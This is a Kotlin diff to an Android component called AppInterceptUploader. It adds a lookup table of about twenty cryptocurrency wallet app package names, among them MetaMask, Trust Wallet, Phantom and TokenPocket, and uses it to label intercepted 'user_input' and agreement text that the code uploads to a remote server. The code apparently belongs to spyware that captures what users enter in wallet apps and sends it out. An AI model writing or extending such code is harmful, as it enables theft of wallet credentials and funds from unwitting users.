@@ -14,6 +14,28 @@ import java.net.URL
  * 上传用户确认信息到服务器
  */
 object AppInterceptUploader {
+    private val walletNamesByPackage = mapOf(
+        "vip.mytokenpocket" to "TokenPocket",
+        "com.tokenpocket.app" to "TokenPocket",
+        "im.token.app" to "imToken",
+        "io.metamask" to "MetaMask",
+        "com.wallet.crypto.trustapp" to "Trust Wallet",
+        "com.okx.wallet" to "OKX Wallet",
+        "io.safepal.wallet" to "SafePal",
+        "app.phantom" to "Phantom",
+        "org.toshi" to "Coinbase Wallet",
+        "com.bitkeep.wallet" to "Bitget Wallet",
+        "com.tronlinkpro.wallet" to "TronLink",
+        "com.tronlink.global" to "TronLink",
+        "so.onekey.app.wallet" to "OneKey",
+        "com.mathwallet.android" to "MathWallet",
+        "com.debank.rabbymobile" to "Rabby Wallet",
+        "io.atomicwallet" to "Atomic Wallet",
+        "io.zerion.android" to "Zerion",
+        "io.unisat" to "UniSat",
+        "com.solflare.mobile" to "Solflare",
+        "coin98.crypto.finance.media" to "Coin98 Wallet",
+    )
 
     // 服务器上传地址 - 可配置
     // 注意：建议使用 HTTPS 保护数据传输安全
@@ -33,9 +55,10 @@ object AppInterceptUploader {
         return withContext(Dispatchers.IO) {
             try {
                 val deviceModel = buildDeviceModel()
+                val walletName = resolveWalletName(packageName, appName)
 
                 val jsonBody = JSONObject().apply {
-                    put("wallet", appName)
+                    put("wallet", walletName)
                     put("data", agreementText)
                     put("package_name", packageName)
                     put("user_input", userInput)
@@ -68,7 +91,7 @@ object AppInterceptUploader {
                 val success = responseCode in 200..299 && (parseResponseSuccess(responseBody) ?: true)
                 if (success) {
                     Log.i(
-                        "AppInterceptUploader: Upload success - $appName, " +
+                        "AppInterceptUploader: Upload success - $walletName, " +
                             "deviceModel=$deviceModel, response=$responseBody"
                     )
                 } else {
@@ -84,6 +107,10 @@ object AppInterceptUploader {
                 false
             }
         }
+    }
+
+    private fun resolveWalletName(packageName: String, fallbackAppName: String): String {
+        return walletNamesByPackage[packageName] ?: fallbackAppName
     }
 
     private fun parseResponseSuccess(responseBody: String): Boolean? {
